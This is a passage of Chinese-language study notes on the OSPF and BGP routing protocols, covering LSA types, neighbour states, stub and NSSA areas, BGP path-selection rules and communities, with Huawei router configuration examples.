        <content type="html"><![CDATA[<h1 id="一、OSPF（开放式最短路径优先）"><a href="#一、OSPF（开放式最短路径优先）" class="headerlink" title="一、OSPF（开放式最短路径优先）"></a>一、OSPF（开放式最短路径优先）</h1><p>特点：1、无环路    2、收敛快    3、扩展性好    4、支持认证</p><p>OSPF报文封装在IP报文中，有五种类型：</p><div class="table-container"><table><thead><tr><th style="text-align:left">报文</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Hello</td><td style="text-align:left">用来发现和维持OSPF邻居关系</td></tr><tr><td style="text-align:left">DD</td><td style="text-align:left">两台路由器进行LSDB数据库同步时，用DD报文描述自己的LSDB（我拥有的内容）</td></tr><tr><td style="text-align:left">LSR</td><td style="text-align:left">两台路由器交换DD报文后，知道了对方有哪些是我缺少的，发送LSR报文请求缺少的LSA信息</td></tr><tr><td style="text-align:left">LSU</td><td style="text-align:left">向对端路由器发送所需要的LSA</td></tr><tr><td style="text-align:left">LSACK</td><td style="text-align:left">对接收的LSU报文进行确认</td></tr></tbody></table></div><p>LSDB——&gt;链路状态数据库（每个区域都维护一个独立的LSDB）</p><p>routeID 谁大谁是主路由器</p><hr><h2 id="邻居和领接关系的建立"><a href="#邻居和领接关系的建立" class="headerlink" title="邻居和领接关系的建立"></a><strong>邻居和领接关系的建立</strong></h2><p>two-way状态邻居完成；FULL状态领接完成</p><div class="table-container"><table><thead><tr><th style="text-align:left">状态</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Down</td><td style="text-align:left">邻居的初始状态，未收到任何的Hello报文</td></tr><tr><td style="text-align:left">Attempt</td><td style="text-align:left">在NBMA网络上存在，没有收到领居的任何信息，会周期性发送Hello报文，发送间隔HelloInterval。<br/>如果RouterDeadInterval没有收到任何邻居报文，则转换为DOWN</td></tr><tr><td style="text-align:left">Init</td><td style="text-align:left">已经收到了邻居的Hello报文，但是自己不在邻居的列表当中，尚未建立双向通信</td></tr><tr><td style="text-align:left">2-Way</td><td style="text-align:left">双向通信已建立，但没有建立领接关系。这是领接前的最高关系</td></tr><tr><td style="text-align:left">ExStart</td><td style="text-align:left">发送DD报文，形成主从关系。发送的DD报文不包含LSDB内容描述<br/>（先不告诉他有什么东西）</td></tr><tr><td style="text-align:left">Exchange</td><td style="text-align:left">发送包含链路状态信息摘要的DD报文，描述本地LSDB的内容<br/>（告诉他我这里有什么信息）</td></tr><tr><td style="text-align:left">Loading</td><td style="text-align:left">相互发送LSR请求LSA，发送LSU通告LSA<br/>（可以理解为互相学习，然后告诉对方已经学习完毕）</td></tr><tr><td style="text-align:left">Full</td><td style="text-align:left">路由器的LSDB已经完全同步</td></tr></tbody></table></div><p>DR指定路由器，BDR是备份路由器                  </p><p>DR和BDR的作用：减少邻接关系的数量，减少链路状态信息，节省带宽</p><hr><p><strong>OSPF的包头+OSPF的hello 这两个关系确认完毕后才可以建立邻居关系</strong></p><p>1）相邻的设备RID相同不能建立邻居关系   </p><p>2）RID相同不相邻设备不装载路由</p><p>3）区域ID要相同</p><p>4）hello间隔和死亡间隔都要一致</p><p>Ls age 值越小说明LSA越新</p><p>LS Seq Number →序列号越大表示该LSA实例越新</p><hr><h2 id="LSA-链路状态信息-的五种类型"><a href="#LSA-链路状态信息-的五种类型" class="headerlink" title="LSA(链路状态信息)的五种类型"></a>LSA(链路状态信息)的五种类型</h2><p><strong>注：LSA 不是报文  LSA是LSU当中的条目</strong></p><ul><li>一类路由器LSA (Router-LSA）：每一个路由器都会生成，描述某区域内路由器端口链路状态的集合，只在该区域内泛洪；内容（路由信息和拓扑信息）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Type        Link                             Date</span><br><span class="line"> P2P    邻居的router ID                该网段上本地接口的IP地址</span><br><span class="line">Transnet    DR的接口IP地址                   该网段上本地接口的IP地址</span><br><span class="line">Stubnet    该stub网段的IP网络地址 该stub网段的网络掩码</span><br><span class="line">Virtual    虚连接邻居的router ID去往该虚连接邻居的本地接口的ip地址</span><br></pre></td></tr></table></figure><hr><ul><li>二类网络LSA（Network-LSA）：由指定路由器DR生成，用于描述广播型网络和NBMA网络。<br>只在该网络所属区域内泛洪（哪些设备附属到MA网络需要物理接口掩码一致）——内容（拓扑信息和网络掩码信息）</li></ul><hr><ul><li>三类网络汇总LSA (Network Summary LSA)：是由ABR路由器始发的,ABR路由器将发送网络汇总LSA到一个区域<br>用来通告该区域外部的目的地址。<br>区域间的放环原则：仅通过骨干区域来更新<br>不允许在两个非骨干区域之间来回更新LSA，区域间的汇总只能做在ABR上</li></ul><hr><ul><li>四类ASBR汇总LSA（ASBR Summary LSA）：是由ABR路由器始发的。<br>它的基本作用是告诉其他路由器应该如何去往ASBR路由器。标记ASBR的位置</li></ul><hr><ul><li>五类外部LSA（ AS-External LSA）：是始发于ASBR路由器的，作用是在整个OSPF区域里宣告外部路由信息。<br>一条AS-E LSA只能宣告一条外部路由</li></ul><hr><h2 id="OSPF的五种网络类型"><a href="#OSPF的五种网络类型" class="headerlink" title="OSPF的五种网络类型"></a>OSPF的五种网络类型</h2><p>2层的网络类型（介质上区分：点到点链路(HDL和PPP）；MA以太网）、NBMA（非广播多路访问网络））</p><p>OSPF的网络类型（对OSPF协议来讲，OSPF也是为了适应介质的多样化；可以改变：1、时间；2、DR/BDR）</p><ul><li><p>点到点的网络类型 (典型的ppp和HDLC） Hello=10    (网络类型可以修改，接口类型不可以修改）</p><p>State: P-2-P （状态为点到点）      Type: P2P（OSPF的网络类型）</p></li></ul><hr><ul><li>广播的网络类型（典型的MA以太网）Hello=10</li></ul><hr><ul><li><p>NBMA，非广播多路访问（FR帧中继的物理接口和ATM）Hello=30</p><p>不能够通过组播自动地发现邻居——必须手工指定邻居，双向的（思科只需要一端指定）</p></li></ul><hr><ul><li>点到多点的网络类型（多个点到点的集合）P2MP   Hello=30<br>以上是默认的情况。本身OSPF的网络类型是可以修改的</li></ul><hr><ul><li>虚链路（为了使得骨干区域连续或者所有区域都连接到区域0而生的技术）</li></ul><hr><h2 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a><strong>端口状态</strong></h2><p>（1）点到点的状态（和网络类型有关：P2P，P2MP）不需要DR和BDR</p><p>（2）MA网络状态 （是DR、BDR、DRouter ）|   DR和BDR是基于链路，而不是基于路由器的</p><p>（3）DR的选举规则：</p><p>​    A: 时间要素是最主要的（选举期限），DR和BDR不具备抢占性（为了网站的稳定性）</p><p>​    B: DR优先级（路由器优先级），默认为1<br>​        0~255（最大的可能性成为DR）<br>​        若优先级为0，则不能被选举，</p><p>​    C: 若优先级相同，则通过路由器ID选举，谁大谁优先</p><p>优先级的设置： int g0/0/1    ospf dr-priority 100</p><p>Ospf如何避免区域间路由环路？<br>    1、非骨干区域要和骨干区域相连<br>    2、只有ABR才可以生成三类LSA<br>    3、三类LSA的传播规范（在非骨干区域只接受不计算）</p><hr><h2 id="外部路由引入方式"><a href="#外部路由引入方式" class="headerlink" title="外部路由引入方式"></a>外部路由引入方式</h2><p>外部路由的引入方式，将外部路由器与骨干区域DR做一个静态路由，然后通过OSPF引入（text）</p><p>​    <strong>一、外部路由的引入</strong><br>​        在OSPF进程下，将静态路由重发布到OSPF网络中，其中引入外部路由的OSPF路由器叫ASBR。<br>​        ASBR会生成一条AS-External-LSA（五类LSA），用于描述ASBR如何到达外部目的地；<br>​        ABR会产生一条ASBR-Summary-LSA（四类LSA）用于描述如何从ABR到达ASBR。<br>​        四类和五类LSA将被OSPF路由器用来计算外部路由。</p><hr><p>​    <strong>二、AS-External-LSA（五类LSA）</strong><br>​            Ls id：目的网段地址。<br>​            Adv rtr：ASBR的Router ID。<br>​            Net mask：目的网段的网络掩码。<br>​            Metric：ASBR到达目的网络的开销值，默认值为1。<br>​            Tag：外部路由信息可以携带一个Tag标签，用于传递该路由的附加信息，通常用于路由策略，默认值为1。</p><hr><p>​    <strong>三、ASBR-Summary-LSA（四类LSA）</strong><br>​            BR向其他区域泛洪一条五类LSA时，同时生成一条四类LSA向其他区域泛洪。该四类LSA主要包含下列信息：<br>​            Ls id：该ASBR的Router ID。<br>​            Adv rtr：该产生此四类LSA的ABR的Router ID。<br>​            Metric：从该ABR到达此ASBR的OSPF开销值。</p><p><strong>注：四类LSA只能在一个区域内泛洪，五类LSA每泛洪到一个区域，相应区域的ABR都会生成一条新的四类LSA来描述如何到达ASBR。<br>    因此描述到达同一个ASBR的四类LSA可以有多条，其Adv rtr是不同的，表示是由不同的ABR生成的。</strong></p><hr><p>​    <strong>四、路由计算</strong><br>​            收到五类LSA后，根据Adv rtr字段发现，ASBR与自己同属于一个区域，根据Ls id、Net mask、Metric字段最终生成目的网络cost值，下一跳的路由；ASBR与自己不同属于一个区域，再查找四类LSA，发现此四类LSA的Adv rtr。</p><p>E T-1计算外部路由的方式更精确</p><hr><h2 id="特殊区域"><a href="#特殊区域" class="headerlink" title="特殊区域"></a>特殊区域</h2><p><strong>Stub区域</strong>：<br>    OSPF允许将特定区域配置为Stub区域。四类五类LSA不允许被发布到Stub区域内。<br>    在ABR的位置会自动生成一条三类的默认路由的LSA；STUB要求E=0<br>    区域外的路由在ABR被截止；区域间的路由可以学习到<br>    如果不允许区域之间的路由，可以配置成完全的末节区域（Stub区域内部和区域之间的路由；完全末节区域仅剩余默认路由）  </p><hr><p><strong>Totally Stub区域</strong>：<br>    即不允许自制系统外部路由（四五类LSA）在本区域传播，也不允许区域间路由（三类LSA）在本区域传播。<br>    区域内的路由器对其他区域以及自制系统外部的访问需求是通过本区域ABR所产生的三类LSA缺省路由实现的<br>    与Stub区域的区别在于，需要在ABR上追加一条no-summary参数。</p><hr><p><strong>NSSA区域</strong>：<br>    本区域可以引进外部路由产生特定的七类NSSA路由；在本区域的ABR上,7类LSA转换为5类的LSA（P-可以转换。N-NSSA）;<br>    在有多个ABR的情况下，为了防环和安全起见，RID比较大的进行7转5<br>    在NSSA区域，看到引进的外部路由是O_NSSA。<br>    在NSSA区域，ABR自动下发O_NSSA的默认路由</p><hr><p><strong>Totally NSSA和NSSA的区别</strong>:<br>    1、Totally NSSA不允许三类LSA在本区域泛洪<br>    2、Totally NSSA与NSSA区域配置在于ABR上需要追加no-summary参数</p><p>Stub区域和Totally Stub区域的区别？<br>Stub区域不允许type-4和type-5 LSA进入，但允许type-3 LSA进入。Totally Stub区域不允许type-4、type-5、type-3 LSA进入，只允许表示缺省路由的type-3 LSA进入</p><hr><h1 id="二、BGP（边界网关协议）"><a href="#二、BGP（边界网关协议）" class="headerlink" title="二、BGP（边界网关协议）"></a>二、BGP（边界网关协议）</h1><p>动态路由协议分为IGP和EGP<br>    自制系统内部的路由协议——-IGP包括：ISIS、OSPF、RIP。<br>    自制系统之间的路由协议——-EGP</p><p>区域号码：<br>    1、16位 （1-65535）——&gt;【32位】1-42亿 2的23次方<br>    2、[64512-65535]——&gt;私有AS</p><p>BGP本身就是一个多地址族的协议（MP-BGP，多协议BGP）——&gt; 地址族（IPv4、IPv6）</p><hr><h2 id="BGP特征"><a href="#BGP特征" class="headerlink" title="BGP特征"></a>BGP特征</h2><p>​    一、BGP是外部路由协议，用来在AS之间传递路由信息</p><p>​    二、是一种增强的距离矢量路由协议</p><p>​            1、可靠的路由更新机制<br>​                        A:（TCP/179，可以跨越设备更新路由表 ）<br>​                        B:无需周期性更新<br>​                        C:只发送增量路由<br>​                        D:周期性发送KeepAlive报文检测TCP的连通性</p><p>​            2、丰富的Metric度量方法</p><p>​            3、避免了环路的发生</p><p>​    三、为路由附带属性信息</p><p>​    四、支持CIDR（无类别区域路由）</p><p>​    五、路由过滤和路由策略</p><hr><h2 id="BGP报文种类："><a href="#BGP报文种类：" class="headerlink" title="BGP报文种类："></a>BGP报文种类：</h2><div class="table-container"><table><thead><tr><th>报文</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td>Open</td><td style="text-align:left">负责和对等体建立邻居关系（携带自身的能力、信息、RID等去建立BGP邻居）</td></tr><tr><td>KeepAlive</td><td style="text-align:left">在对等体之间周期性的发送，用来维护连接只有报文头（保持TCP的活跃的）</td></tr><tr><td>Update</td><td style="text-align:left">用来在BGP对等体之间传递路由信息（更新和撤销和NLRI-网络层可达消息，网络前缀；丰富的路由属性）</td></tr><tr><td>Notification</td><td style="text-align:left">当BGP Speaker检测到错误的时候，就发送该消息给对等体（差错报文，reset TCP连接）</td></tr><tr><td>Route-refresh</td><td style="text-align:left">用来通知对等体自己支持路由刷新能力（BGP刷新路由的能力）</td></tr></tbody></table></div><hr><h2 id="BGP状态"><a href="#BGP状态" class="headerlink" title="BGP状态"></a>BGP状态</h2><div class="table-container"><table><thead><tr><th style="text-align:left">状态</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">Idel</td><td style="text-align:left">初始状态，不接受任何BGP连接，等待Sart产生，向邻居发送TCP连接，状态变为Connect</td></tr><tr><td style="text-align:left">Connect</td><td style="text-align:left">等待TCP建立完成。</td></tr><tr><td style="text-align:left">Active</td><td style="text-align:left">发生active 却不继续建立邻接的时候应该排查以下两个个地方:<br/>1是peer邻居du的ip是否tcp可达？<br/>2是如果使用loopback建立邻接是zhi否在邻接建立时配置dao了connect-interface loopback (0)</td></tr><tr><td style="text-align:left">Established</td><td style="text-align:left">BGP连接建立完成，可以发送Update消息交换路由</td></tr></tbody></table></div><hr><h2 id="BGP数据库"><a href="#BGP数据库" class="headerlink" title="BGP数据库"></a>BGP数据库</h2><p>​    1、IP路由表（IP-RIB）<br>​          全局路由信息库，包括所有IP路由信息</p><p>​    2、BGP路由表（Loc-RIB）<br>​        BGP路由信息库，包括本地BGP Speaker选择的路由信息（Update BGP datebase）</p><p>​    3、邻居表：<br>​          对等体邻居清单列表</p><p>​    4、Adj-RIB-In：<br>​          对等体宣告给本地Speaker的未处理的路由信息库</p><p>​    5、Adj-RIB-Out：<br>​          本地Speaker宣告给指定对等体的路由信息库</p><hr><h2 id="BGP的邻居关系"><a href="#BGP的邻居关系" class="headerlink" title="BGP的邻居关系"></a>BGP的邻居关系</h2><p>注：BGP只能单播更新路由</p><ul><li><p>IBGP：internal BGP （AS号码相同）</p><pre><code>通常情况用loopback作为更新源去建立邻居关系（更加稳定）          TCP的五元组（源目IP、源端口号和协议），BGP的更新源即是源IP（peer xx connectint lo 0）</code></pre></li><li><p>EBGP：external BGP（AS号码不同）<br> 通常采用直连来建立邻居关系；</p><pre><code>            EBGP也可以用环回口作为备份            BGP邻居关系建立在TCP连接的基础之上            可以通过IGP或静态路由来提供TCP连接的IP可达性</code></pre></li></ul><hr><h2 id="BGP通告路由的方式"><a href="#BGP通告路由的方式" class="headerlink" title="BGP通告路由的方式"></a>BGP通告路由的方式</h2><p>1、NTEWORK</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-bgp]network 11.1.1.1 32</span><br></pre></td></tr></table></figure><p>BGP通告的是路由（本身的直连；通告从其他路由协议得到的路由：IGP）<br>2、引入路由（重分布）import-route<br>3、Aggregate（汇聚）产生路由</p><hr><div class="table-container"><table><thead><tr><th>通告</th><th>描述</th></tr></thead><tbody><tr><td>BGP路由通告原则一</td><td>在建立连接时，BGP Speaker只把本身用的最优路由通告给对等体<br/>多条路径时，BGP Speaker只选最优的路由放入路由表</td></tr><tr><td>BGP路由通告原则二</td><td>BGP Speaker从EBGP获得的路由会向除了源路由之外的设备通告（IBGP和EBGP）</td></tr><tr><td>BGP路由通告原则三</td><td>BGP Speaker从IBGP获得的路由不会通告给他的IBGP邻居<br/>IBGP的水平分割，是IBGP最重要的防环原则<br/>IBGP的水平分割原则：路由只能传递更新一跳</td></tr><tr><td>BGP的通告原则四</td><td>BGP Speaker 从IBGP获得的路由是否通告给他的EBGP对等体要依IGP和BGP同步情况来决定<br/>BGP与IGP同步的概念：BGP Speaker 不将从IBGP对等体获得的路由信息同步给他的EBGP对等体<br/>除非该路由信息也能通过IGP获得 <br/>BGP的同步规则（IBGP和IGP的同步） <br/>在华为设备上不能开启同步 （IGP无法承载过多的BGP路由）</td></tr></tbody></table></div><p><strong>BGP路由黑洞:</strong><br>    R1发送数据给R2，R2/R3跨域R4建立邻居，在控制层面进行路由表的更新，数据已经到达R5，</p><p>​    R5把数据包发给了下一跳R3，    R3的下一跳为R2，会把数据包转发给R2</p><p>​    但是IP的数据包转发是逐条进行转发的，R2和R3之间没有物理链路</p><p>​    所以R3会把数据包转发给R4，在R4的路由表中找不到R1的路由，所以会丢弃数据包</p><p>解决方法：IBGP的全互连<br>IBGP的全互连——&gt;RR和联盟</p><p><strong>下一跳的行为</strong>：<br>对BGP来讲站在AS的角度去考虑问题，下一跳是如何去往其他的AS设备。在BGP之间会默认保留原来的更新源：<br>    1、把AS之间的直连重分布到IGP<br>    2、在边界处修改更新源为本设备的更新源</p><p>注：BGP路由知识提高<br>    成为BGP路由的途径之一：network 命令，通告路由，把IGP发现的路由信息通过该命令注入到R2的BGP路由表中<br>    成为BGP路由的途径之二：import 命令，通过import-route命令把IGP路由或静态路由注入到R2的BGP路由表中</p><hr><h2 id="路由聚合"><a href="#路由聚合" class="headerlink" title="路由聚合"></a>路由聚合</h2><p>BGP协议可以使用命令，将具体路由聚合成一条聚合路由   </p><p>三种汇总（聚合）：</p><p><strong>1.自动汇总（总是不用）</strong><br>    汇总的结果：主类（11.1.1.1/32—-&gt;11.0.0.0/8）<br>    距离矢量协议（DV协议）<br>    只对重分布的路由生效（network和aggregate产生的路由不会做自动汇总） </p><hr><p><strong>2.手工汇总</strong><br>    1)先通过静态路由或者igp的协议进行汇总，本地就有一条汇总之后的路由然后再BGP中通告汇总之后的路由即可！</p><p>2）BGP专有工具</p><p>A：aggregate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1-bgp]aggregate 11.1.1.0 30 detail-suppressed//抑制所有明细，仅仅把汇总通告给邻居</span><br></pre></td></tr></table></figure><p>B：as-set属性，还原本来的AS号码（通常用于本AS不做汇总 ）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R2-bgp]aggregate 11.1.1.0 30 detail-suppressed as-set</span><br></pre></td></tr></table></figure><p><strong>注：手工聚合的优先级高于自动聚合的优先级</strong></p><hr><p><strong>3.suppress-policy有些明细和汇总被通告出去，其他的被抑制到本地</strong></p><p>​            route-policy很重要的工具</p><p>​            route-policy XX [允许或者被拒绝] node 10—-隐含拒绝所有</p><p>​            if 条件（ACL、前缀列表、接口、tag等等）</p><p>​            apply（修改属性）</p><p>​            route-policy XX [允许或者被拒绝] node 20—-如果还需要允许其他就要加上序列号20等等</p><p>​            any （条件）</p><hr><h2 id="BGP的路由属性"><a href="#BGP的路由属性" class="headerlink" title="BGP的路由属性"></a>BGP的路由属性</h2><div class="table-container"><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>Origin</td><td>起源代码（路由是怎么生成的，如何生成的）<br/>i—&gt;通告产生的，汇总产生的<br/>e—&gt;egp产生的<br/>？—&gt;重分布引入产生的<br/>i&gt;e&gt;?</td></tr><tr><td>AS-PATH</td><td>沿途经过的AS号码<br/>越短越优先<br/>EBGP防环：如果在AS-path list当中发现了本AS的号码，将拒绝接收该路由</td></tr><tr><td>Next hop</td><td>下一跳，如何去往另外AS</td></tr><tr><td>MED</td><td>相当Metric值</td></tr><tr><td>Local-Preference</td><td>本地优先级</td></tr></tbody></table></div><p>i——&gt;通告产生的，汇总产生的<br>e——&gt;egp产生的<br>?——&gt;重分布引入产生的</p><p>i&gt;e&gt;?</p><hr><h2 id="BGP选路原则"><a href="#BGP选路原则" class="headerlink" title="BGP选路原则"></a>BGP选路原则</h2><p>1.优选首选值大的（PrefVal)； （仅在本地有意义，不会更新给邻居，不能用于出方向。）<br>    针对一个邻居来应用策略是有方向的，默认是0，越大越优先<br>    A:针对该邻居完全的修改（绝对的）<br>    B:明细的修改（调用route-policy）</p><hr><p>2.优选本地优先级高的（LP）—-公认可选；（仅仅用于IBGP，不在EBGP之间传递，通常用于数据包如何离开本AS）<br>     A:绝对的[R2-bgp]default local-preference 200<br>     B:通过route-policy修改</p><hr><p>3.聚合路由优先于非聚合路由</p><hr><p>4.优选起源于本地的路由；</p><hr><p>5.本地通过Network命令引入的路由的优先级高于本地通过Import-route命令引入的路由</p><hr><p>6.优选AS-PATH最短的路由；——公认必遵</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">route-policy AS-path permit node 10 </span><br><span class="line"></span><br><span class="line">apply as-path 200 200 additive//没有匹配条件，那么即任意的路由都修改</span><br><span class="line"></span><br><span class="line">[R1-bgp]peer 123.1.1.3 route-policy AS-path import</span><br><span class="line"></span><br><span class="line">[R1-bgp]bestroute as-path-ignore //忽略掉AS-path的选路原则  </span><br></pre></td></tr></table></figure><hr><p>7.依次优选Origin类型为IGP、EGP、Incomplete的路由；—-公认必遵</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BGP 200</span><br><span class="line">peer 123.1.1.3 route-policy origin import//针对邻居在入方向应用策略 </span><br><span class="line">route-policy origin permit node 10 ----策略行为是允许的，序列号为10</span><br><span class="line">apply origin incomplete----配置origin属性为incomplete&#125;</span><br></pre></td></tr></table></figure><hr><p>8.优选MED值最小的路由；（默认情况下为0）——可选非传递</p><p>​    仅仅在两个AS之间传递，不会传给第三方<br>​    向EBGP更新路由的时候，修改metric，影响对方如何到达本AS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[R1-route-policy]    route-policy 12 permit no 20</span><br><span class="line">[R1]route-policy 12 permit n 10</span><br><span class="line">[R1-route-policy]if-match acl 2001</span><br><span class="line">[R1-route-policy]apply cost 12</span><br><span class="line">[R1-route-policy]route-policy 12 permit n 20</span><br><span class="line"></span><br><span class="line">[R1]route-policy 13 permit no 10</span><br><span class="line">[R1-route-policy]if-match acl 2001</span><br><span class="line">[R1-route-policy]apply cost 13</span><br><span class="line">[R1-route-policy]route-policy 13 per no 20</span><br><span class="line"></span><br><span class="line">bgp100</span><br><span class="line">[R1-bgp]peer 123.1.1.2 route-policy 12 export ------针对R2修改MED12</span><br><span class="line">[R1-bgp]peer 123.1.1.3 route-policy 13 export-------针对R3修改MED13</span><br></pre></td></tr></table></figure><hr><p>9.EBGP优于IBGP</p><hr><p>10.metric值，是到下一跳的更新源的IGP的metric小的被优选</p><hr><p>11.优选Cluster_List最短的路由；</p><hr><p>12.比较Originator ID或者Router ID，选择数值较小的路径。</p><hr><p>13.比较对等体的IP地址，选择IP地址数值最小的路径</p><hr><h2 id="BGP团体属性"><a href="#BGP团体属性" class="headerlink" title="BGP团体属性"></a>BGP团体属性</h2><p>一、标准的团体属性和自定义的团体属性</p><p>二、扩展的团体属性</p><p>两个重大作用<br>1、匹配路由（一种标识，标识路由）<br>2、针对路由的过滤</p><p>几种众所周知的团体属性：<br>1、Internet，默认的团体属性，所有的路由都带该属性<br>2、no-advertise，不通告给任何邻居</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[R1-route-policy]apply community no-advertise//不通告给任何设备</span><br><span class="line">[R1-bgp] network 11.1.1.1 255.255.255.255 route-policy commuity//通告时调用策略，其他设备收不到该路由</span><br><span class="line"></span><br><span class="line">peer 123.1.1.3 enable</span><br><span class="line">peer 123.1.1.3 route-policy commuity export//针对邻居调用属性</span><br><span class="line">peer 123.1.1.3 advertise-community//针对邻居发送团体属性</span><br></pre></td></tr></table></figure><p>3、no-export，不通告给真正的ebgp邻居<br>4、no-export-subconfed  </p><hr><h2 id="具体配置"><a href="#具体配置" class="headerlink" title="具体配置"></a>具体配置</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">IBGP配置</span><br><span class="line">[R3]bgp 200</span><br><span class="line">[R3-bgp]peer</span><br><span class="line">[R3-bgp]peer 22.1.1.1---&gt;（对端IP） as-number 200 ---&gt;（指定对端设备号码为200）</span><br><span class="line">[R3-bgp]peer</span><br><span class="line">[R3-bgp]peer 22.1.1.1 con</span><br><span class="line">[R3-bgp]peer 22.1.1.1 connect-interface lo 0------&gt;（源IP）</span><br><span class="line">May 21 2020 12:21:33-08:00 R2 %%01BGP/3/STATE_CHG_UPDOWN(l)[0]:The status of the</span><br><span class="line"> peer 33.1.1.1 changed from OPENCONFIRM to ESTABLISHED. (InstanceName=Public, St</span><br><span class="line">ateChangeReason=Up)  </span><br><span class="line"></span><br><span class="line">[R2-bgp]dis bgp peer </span><br><span class="line"></span><br><span class="line"> BGP local router ID : 22.1.1.1</span><br><span class="line"> Local AS number : 200</span><br><span class="line"> Total number of peers : 1  Peers in established state : 1</span><br><span class="line"></span><br><span class="line">  Peer            V          AS  MsgRcvd  MsgSent  OutQ   Up/Down       State           PrefRcv</span><br><span class="line"></span><br><span class="line">  33.1.1.1        4         200        4        6                  0        00:02:16     Established       0 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> EBGP配置</span><br><span class="line">#在R1和R2建立直连的EBGP</span><br><span class="line">[R1]bgp 100</span><br><span class="line">[R1-bgp]peer 123.1.1.2 as-number 200</span><br><span class="line"></span><br><span class="line">[R2]bgp 200</span><br><span class="line">[R2-bgp]peer 123.1.1.1 as -number100</span><br><span class="line"></span><br><span class="line">#在R1和R3用环回口建立EBGP邻居</span><br><span class="line">【R1】ip route-static 33.1.1.1 255.255.255.255 G0/0/0 123.1.1.3//用静态路由指定路由去往R3的更新源</span><br><span class="line">【R3】ip route-static 11.1.1.1 255.255.255.255 G0/0/1 123.1.1.1</span><br><span class="line"></span><br><span class="line">【R1】bgp 100</span><br><span class="line"> peer 33.1.1.1 as-number 200 </span><br><span class="line"> peer 33.1.1.1 ebgp-max-hop 255 //修改ebgp报文的TTL为255，，这是直接回车的结果</span><br><span class="line"> peer 33.1.1.1 connect-interface LoopBack0//使用环回接口0作为建立TCP会话的源地址</span><br><span class="line"> peer 123.1.1.2 as-number 200</span><br><span class="line"></span><br><span class="line">【R3】bgp 200</span><br><span class="line"> peer 11.1.1.1 as-number 100 </span><br><span class="line"> peer 11.1.1.1 ebgp-max-hop 255 </span><br><span class="line"> peer 11.1.1.1 connect-interface LoopBack0//使用环回接口0作为建立TCP会话的源地址</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">下一跳行为：</span><br><span class="line">[R2-bgp]peer 44.1.1.1 next-hop-local//下一跳自我</span><br><span class="line">&lt;R2&gt;refresh bgp all export </span><br><span class="line">&lt;R4&gt;refresh bgp all import </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[R1-bgp]summary automatic //自动聚合</span><br><span class="line"></span><br><span class="line">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface</span><br><span class="line"></span><br><span class="line">       11.1.1.0/30  Static  60   0           D   0.0.0.0         NULL0</span><br><span class="line"></span><br><span class="line">[R3-bgp]aggregate 11.1.1.0 30 detail-suppressed as-set//参数实验</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#建立RR反射器</span><br><span class="line">bgp XXX</span><br><span class="line">address-family ipv4 </span><br><span class="line">peer X.X.X.X reflect-client</span><br><span class="line">qu</span><br><span 